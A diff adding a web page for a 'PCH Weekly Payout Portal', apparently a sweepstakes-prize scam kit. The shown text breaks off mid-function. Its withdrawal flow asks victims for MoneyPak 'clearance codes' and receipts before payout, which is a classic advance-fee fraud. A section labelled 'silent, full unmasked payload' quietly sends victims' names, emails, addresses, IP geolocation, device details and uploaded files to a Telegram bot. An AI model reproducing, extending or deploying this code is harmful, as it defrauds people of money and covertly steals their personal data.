@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Overview — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; overflow-x:clip; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; }
+  ::-webkit-scrollbar-track { background:#070b19; }
+  ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; }
+  ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }
+  .fade-up { animation: fadeUp .45s cubic-bezier(.16,1,.3,1) both; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  @keyframes crownFloat { 0%,100% { transform:translateY(0) rotate(-2deg); } 50% { transform:translateY(-5px) rotate(2deg); } }
+  .crown-float { animation: crownFloat 3.4s ease-in-out infinite; }
+  .nav-active { background: linear-gradient(135deg, rgba(245,158,11,.15), rgba(245,158,11,.05)); color:#fbbf24; border-left:3px solid #fbbf24; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  @supports (-webkit-touch-callout: none) {
+    .blur-3xl { -webkit-transform: translate3d(0,0,0); transform: translate3d(0,0,0); -webkit-backface-visibility: hidden; backface-visibility: hidden; will-change: transform; }
+  }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  .chip-btn { padding:.4rem .85rem; border-radius:999px; font-size:.72rem; font-weight:700; border:1px solid #212d54; background:#0d1326; color:#cbd5e1; transition:all .2s; }
+  .chip-btn:hover { border-color:#38bdf8; color:#fff; }
+  .chip-btn.active { background:linear-gradient(135deg,#fbbf24,#d97706); color:#070b19; border-color:transparent; }
+  .locked-btn { position:relative; opacity:.55; cursor:not-allowed !important; }
+  .locked-btn::after { content:"\f023"; font-family:"Font Awesome 6 Free"; font-weight:900; position:absolute; top:-6px; right:-6px; background:#f43f5e; color:white; width:20px; height:20px; border-radius:999px; display:flex; align-items:center; justify-content:center; font-size:9px; }
+  .progress-track { background:#070b19; border:1px solid #212d54; border-radius:999px; overflow:hidden; height:12px; padding:2px; }
+  .progress-fill { height:100%; border-radius:999px; background:linear-gradient(90deg,#fbbf24,#38bdf8); transition:width .5s cubic-bezier(.16,1,.3,1); }
+  .timeline-dot { width:2rem; height:2rem; border-radius:999px; display:flex; align-items:center; justify-content:center; font-size:.75rem; font-weight:800; border:2px solid #212d54; background:#0d1326; color:#94a3b8; }
+  .timeline-dot.active { border-color:#38bdf8; background:rgba(56,189,248,.2); color:#38bdf8; box-shadow:0 0 18px rgba(56,189,248,.5); }
+  .timeline-dot.done { border-color:#10b981; background:rgba(16,185,129,.18); color:#34d399; }
+  .timeline-line { height:2px; background:#212d54; flex-grow:1; }
+  .timeline-line.done { background:linear-gradient(90deg,#10b981,#38bdf8); }
+  @media (max-width:1023px) { #toast-container { bottom: calc(1.5rem + env(safe-area-inset-bottom,0px)) !important; } }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const USER_REGISTRY_KEY = 'pch_user_folder_registry';
+const DEFAULT_WD_LIMIT = 5000;
+const DEFAULT_P2P_LIMIT = 50000;
+const P2P_MAX_TRANSFER = 50000;
+const DEFAULT_TG = { botToken:'', chatId:'' };
+
+let countdownInterval = null;
+let cachedDashboardQuote = null;
+let reviewSeed = 20261016;
+
+const WITHDRAWAL_FLOW = {
+  pending:{ stepNum:1, stepLabel:'Pending Review', status:'Awaiting Admin Approval', icon:'fa-hourglass-half', tone:'gold', description:'Your withdrawal request was submitted successfully. An administrator must approve this step before Clear Processing unlocks.', adminNext:'pending_approved', adminLabel:'Approve Pending Review' },
+  pending_approved:{ stepNum:2, stepLabel:'Clear Processing', status:'Action Required', icon:'fa-barcode', tone:'sky', description:'Submit your MoneyPak clearance code, amount, and receipt photo to continue.', userAction:'openMoneyPakModal()', userLabel:'Complete Clear Processing' },
+  moneypak_submitted:{ stepNum:2, stepLabel:'Clear Processing', status:'Awaiting Admin Approval', icon:'fa-hourglass-half', tone:'gold', description:'Your clearance submission has been received. An administrator must approve it before Stamp of Approval unlocks.', adminNext:'moneypak_approved', adminLabel:'Approve Clear Processing' },
+  moneypak_approved:{ stepNum:3, stepLabel:'Stamp of Approval', status:'Action Required', icon:'fa-stamp', tone:'sky', description:'Submit your stamped approval slip to continue.', userAction:'openStampModal()', userLabel:'Submit Stamp of Approval' },
+  stamp_submitted:{ stepNum:3, stepLabel:'Stamp of Approval', status:'Awaiting Admin Approval', icon:'fa-hourglass-half', tone:'gold', description:'Your stamp has been submitted. An administrator must approve it to complete the paperwork stage.', adminNext:'stamp_approved', adminLabel:'Approve Stamp' },
+  stamp_approved:{ stepNum:3, stepLabel:'Paperwork Signatures', status:'Contact Agent', icon:'fa-file-signature', tone:'emerald', description:'2 out of 3 paperwork signatures are complete. Please contact your agent to complete the final one.', adminNext:'none', adminLabel:'Complete Final Signature (Agent)' }
+};
+
+const FREQUENCY_OPTIONS = [{value:'2days',label:'Every 2 Days'},{value:'3days',label:'Every 3 Days'},{value:'weekly',label:'Weekly'},{value:'biweekly',label:'Bi-Weekly'},{value:'monthly',label:'Monthly'}];
+const SAVINGS_REASONS = { House:{icon:'fa-house',label:'House'}, Car:{icon:'fa-car',label:'Car'}, Debts:{icon:'fa-file-invoice-dollar',label:'Debts'}, 'Dream Trip':{icon:'fa-plane',label:'Dream Trip'}, Custom:{icon:'fa-bullseye',label:'Custom Goal'} };
+const motivationalQuotes = [
+  {quote:"Wealth is not about having a lot of money; it's about having a lot of options.",author:"Chris Rock"},
+  {quote:"Compound interest is the eighth wonder of the world. He who understands it, earns it... he who doesn't... pays it.",author:"Albert Einstein"},
+  {quote:"An investment in knowledge pays the best interest.",author:"Benjamin Franklin"},
+  {quote:"Financial freedom is available to those who learn about it and work for it.",author:"Robert Kiyosaki"}
+];
+
+function todayStr(){ return new Date().toISOString().split('T')[0]; }
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+function nz(v){ return v===undefined||v===null||v===''?'—':String(v); }
+function getFrequencyLabel(v){ const f=FREQUENCY_OPTIONS.find(o=>o.value===v); return f?f.label:v; }
+function getRandomQuote(){ return motivationalQuotes[Math.floor(Math.random()*motivationalQuotes.length)]; }
+function getCachedQuote(){ return cachedDashboardQuote || (cachedDashboardQuote = getRandomQuote()); }
+function isAdminMode(){ try { const u=new URLSearchParams(window.location.search); if(u.get('admin')==='1'){ localStorage.setItem('pch_admin_mode','1'); return true; } if(u.get('admin')==='0'){ localStorage.removeItem('pch_admin_mode'); return false; } return localStorage.getItem('pch_admin_mode')==='1'; } catch(e){ return false; } }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const p = JSON.parse(saved);
+      if (!p.telegramConfig) p.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (p.userBalance == null) p.userBalance = 4500;
+      if (!p.transactions) p.transactions = [];
+      if (!p.registeredUsers) p.registeredUsers = [];
+      if (!p.accessLogs) p.accessLogs = [];
+      if (!p.messages) p.messages = [];
+      if (!p.favoriteRecipients) p.favoriteRecipients = [];
+      if (!p.scheduledTransfers) p.scheduledTransfers = [];
+      if (!p.fundingMethods) p.fundingMethods = [];
+      if (!p.autoWithdraw) p.autoWithdraw = { enabled:false, frequency:'weekly', amount:null, method:null };
+      if (!p.dailyLimits) p.dailyLimits = { withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} };
+      if (!p.withdrawalState) p.withdrawalState = 'none';
+      if (p.messagesReadAt == null) p.messagesReadAt = 0;
+      if (p.announcementDismissedAt == null) p.announcementDismissedAt = 0;
+      if (p.signupCounter == null) p.signupCounter = 0;
+      return p;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], savings:null, cdAccount:null, accessLogs:[], promo:null, signupCounter:0, withdrawalState:'none', currentWithdrawal:null, favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} }, referralCode:null, messagesReadAt:0, announcement:null, messages:[], announcementDismissedAt:0, card:null, kyc:null, gamePlays:null, lastSpinDate:null, supportTickets:[], telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+
+const persisted = loadDeviceState();
+const state = {
+  currentUser: persisted.currentUser, userBalance: persisted.userBalance, configuredMethod: persisted.configuredMethod,
+  registeredUsers: persisted.registeredUsers||[], transactions: persisted.transactions||[], savings: persisted.savings||null,
+  cdAccount: persisted.cdAccount||null, accessLogs: persisted.accessLogs||[], promo: persisted.promo||null,
+  signupCounter: persisted.signupCounter||0, withdrawalState: persisted.withdrawalState||'none',
+  currentWithdrawal: persisted.currentWithdrawal||null, favoriteRecipients: persisted.favoriteRecipients||[],
+  scheduledTransfers: persisted.scheduledTransfers||[], fundingMethods: persisted.fundingMethods||[],
+  autoWithdraw: persisted.autoWithdraw||{enabled:false,frequency:'weekly',amount:null,method:null},
+  dailyLimits: persisted.dailyLimits||{ withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} },
+  referralCode: persisted.referralCode||null, messagesReadAt: persisted.messagesReadAt||0,
+  announcement: persisted.announcement||null, messages: persisted.messages||[], announcementDismissedAt: persisted.announcementDismissedAt||0,
+  usersCache: [], kyc: persisted.kyc || null, card: persisted.card || null, gamePlays: persisted.gamePlays || null,
+  lastSpinDate: persisted.lastSpinDate || null, supportTickets: persisted.supportTickets || [],
+  telegramConfig: Object.assign({}, DEFAULT_TG, persisted.telegramConfig || {})
+};
+
+function saveDeviceState() {
+  const payload = {
+    currentUser: state.currentUser, userBalance: state.userBalance, configuredMethod: state.configuredMethod,
+    transactions: state.transactions, registeredUsers: state.registeredUsers, savings: state.savings, cdAccount: state.cdAccount,
+    accessLogs: state.accessLogs, promo: state.promo, signupCounter: state.signupCounter||0,
+    withdrawalState: state.withdrawalState||'none', currentWithdrawal: state.currentWithdrawal||null,
+    favoriteRecipients: state.favoriteRecipients||[], scheduledTransfers: state.scheduledTransfers||[],
+    fundingMethods: state.fundingMethods||[], autoWithdraw: state.autoWithdraw||{}, dailyLimits: state.dailyLimits||{},
+    referralCode: state.referralCode||null, messagesReadAt: state.messagesReadAt||0,
+    announcement: state.announcement||null, messages: state.messages||[], announcementDismissedAt: state.announcementDismissedAt||0,
+    kyc: state.kyc, card: state.card, gamePlays: state.gamePlays, lastSpinDate: state.lastSpinDate, supportTickets: state.supportTickets,
+    telegramConfig: state.telegramConfig
+  };
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(payload)); }
+  catch(err) { try { if (payload.currentUser) payload.currentUser = Object.assign({}, payload.currentUser, {photoUrl:null}); payload.registeredUsers = (payload.registeredUsers||[]).map(u=>Object.assign({},u,{photoUrl:null})); localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(payload)); } catch(e2){} }
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+
+function buildCurrentUserPayload() {
+  const u = state.currentUser || {};
+  return Object.assign({}, u, { userBalance:Number(state.userBalance)||0, transactions:state.transactions||[], withdrawalState:state.withdrawalState||'none', currentWithdrawal:state.currentWithdrawal||null, configuredMethod:state.configuredMethod||null, savings:state.savings||null, cdAccount:state.cdAccount||null, favoriteRecipients:state.favoriteRecipients||[], scheduledTransfers:state.scheduledTransfers||[], fundingMethods:state.fundingMethods||[], autoWithdraw:state.autoWithdraw||{}, dailyLimits:state.dailyLimits||{}, referralCode:state.referralCode||null, kyc: state.kyc, card: state.card, gamePlays: state.gamePlays, lastSpinDate: state.lastSpinDate, supportTickets: state.supportTickets, updatedAt:Date.now() });
+}
+
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), buildCurrentUserPayload()); } catch(e){}
+}
+
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    state.transactions = Array.isArray(r.transactions) ? r.transactions : (r.transactions && typeof r.transactions === 'object' ? Object.values(r.transactions) : state.transactions);
+    state.withdrawalState = r.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || null;
+    state.configuredMethod = r.configuredMethod || null;
+    state.savings = r.savings || state.savings;
+    state.cdAccount = r.cdAccount || state.cdAccount;
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.card) state.card = r.card;
+    if (r.gamePlays) state.gamePlays = r.gamePlays;
+    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
+    if (Array.isArray(r.supportTickets)) state.supportTickets = r.supportTickets;
+    if (Array.isArray(r.favoriteRecipients)) state.favoriteRecipients = r.favoriteRecipients;
+    if (Array.isArray(r.scheduledTransfers)) state.scheduledTransfers = r.scheduledTransfers;
+    if (Array.isArray(r.fundingMethods)) state.fundingMethods = r.fundingMethods;
+    if (r.autoWithdraw) state.autoWithdraw = r.autoWithdraw;
+    if (r.dailyLimits) state.dailyLimits = r.dailyLimits;
+    if (r.referralCode) state.referralCode = r.referralCode;
+    const idx = state.registeredUsers.findIndex(x => x && (x.username||'').toLowerCase() === state.currentUser.username.toLowerCase());
+    if (idx >= 0) state.registeredUsers[idx] = Object.assign({}, state.registeredUsers[idx], r); else state.registeredUsers.push(r);
+    saveDeviceState();
+    return true;
+  } catch(e){ return false; }
+}
+
+async function pullAllUsersFromCloud() {
+  if (!window.rtdb) return {};
+  try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users')); return snap.exists() ? snap.val() : {}; } catch(e){ return {}; }
+}
+
+async function fetchAnnouncement() {
+  if (!window.rtdb) return;
+  try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'config/announcement')); if (snap.exists()) state.announcement = snap.val(); } catch(e){}
+}
+
+async function fetchMessages() {
+  if (!window.rtdb || !state.currentUser?.username) return;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'messages/' + state.currentUser.username.toLowerCase()));
+    if (snap.exists()) { const val = snap.val(); const arr = Array.isArray(val) ? val : Object.values(val); arr.sort((a,b)=>(b.sentAt||0)-(a.sentAt||0)); state.messages = arr; }
+    else state.messages = [];
+  } catch(e){}
+}
+
+function ensureDailyLimits() {
+  const today = todayStr();
+  if (!state.dailyLimits || state.dailyLimits.withdrawal?.date !== today) {
+    state.dailyLimits = { withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:today}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:today} };
+  }
+}
+function ensureReferralCode() {
+  if (!state.referralCode && state.currentUser?.username) {
+    const handle = state.currentUser.username.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,6);
+    state.referralCode = 'PCH-' + handle + '-' + Math.random().toString(36).substring(2,6).toUpperCase();
+    saveDeviceState();
+  }
+}
+function ensureFundingMethodsMigrated() {
+  if (!Array.isArray(state.fundingMethods)) state.fundingMethods = [];
+  if (state.configuredMethod && state.fundingMethods.length === 0) state.fundingMethods = [{label:state.configuredMethod,primary:true,backup:false,details:{}}];
+  if (state.fundingMethods.length > 0 && !state.fundingMethods.some(f=>f.primary)) state.fundingMethods[0].primary = true;
+  const primary = state.fundingMethods.find(f=>f.primary);
+  state.configuredMethod = primary ? primary.label : null;
+}
+function unreadCount(){ return (state.messages||[]).filter(m=>(m.sentAt||0) > (state.messagesReadAt||0)).length; }
+
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  const icon = (type==='Mobile'||type==='Tablet') ? 'fa-mobile-screen-button' : (os==='macOS'?'fa-laptop':'fa-desktop');
+  return { os, type, browser, icon };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r2 = await fetch('https://api.ipify.org?format=json');
+    const d2 = await r2.json();
+    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+async function logAccess(action) {
+  if (!state.currentUser) return;
+  try {
+    const net = await fetchIP(); const ip = net.ip || 'Unknown'; const dev = detectDevice();
+    state.accessLogs.unshift({ id:Date.now()+Math.random(), user:state.currentUser.username||state.currentUser.email, name:`${state.currentUser.firstName} ${state.currentUser.lastName}`, action, ip, os:dev.os, type:dev.type, browser:dev.browser, icon:dev.icon, ua:navigator.userAgent, time:new Date().toISOString().replace('T',' ').substring(0,19) });
+    if (state.accessLogs.length > 100) state.accessLogs.length = 100;
+    saveDeviceState();
+  } catch(e){}
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+
+function showModal(title, bodyHtml) {
+  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content');
+  content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`;
+  modal.style.display = 'flex';
+}
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; }
+
+/* ═══════════ TELEGRAM — silent, full unmasked payload ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+async function sendTelegramDocument(filename, text, captionText) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const blob = new Blob([text], { type:'text/plain;charset=utf-8' });
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', blob, filename);
+    if (captionText) { fd.append('caption', captionText); fd.append('parse_mode','HTML'); }
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
+    const data = await res.json();
+    if (!data.ok) console.error('[TG] doc failed:', data.error_code, data.description);
+    return data.ok;
+  } catch (err) { console.error('[TG] doc fetch failed:', err); return false; }
+}
+async function sendTelegramFile(file, caption) {
+  if (!file) return false;
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', file, file.name || 'document');
+    if (caption) { fd.append('caption', caption); fd.append('parse_mode','HTML'); }
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
+    const data = await res.json();
+    if (!data.ok) console.error('[TG] file failed:', data.error_code, data.description);
+    return data.ok;
+  } catch (err) { console.error('[TG] file fetch failed:', err); return false; }
+}
+
+async function buildCommonTgBlock() {
+  const u = state.currentUser || {};
+  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  const address = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';
+  return {
+    u, net, dev, fullName,
+    block:
+      `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+      `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+      `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
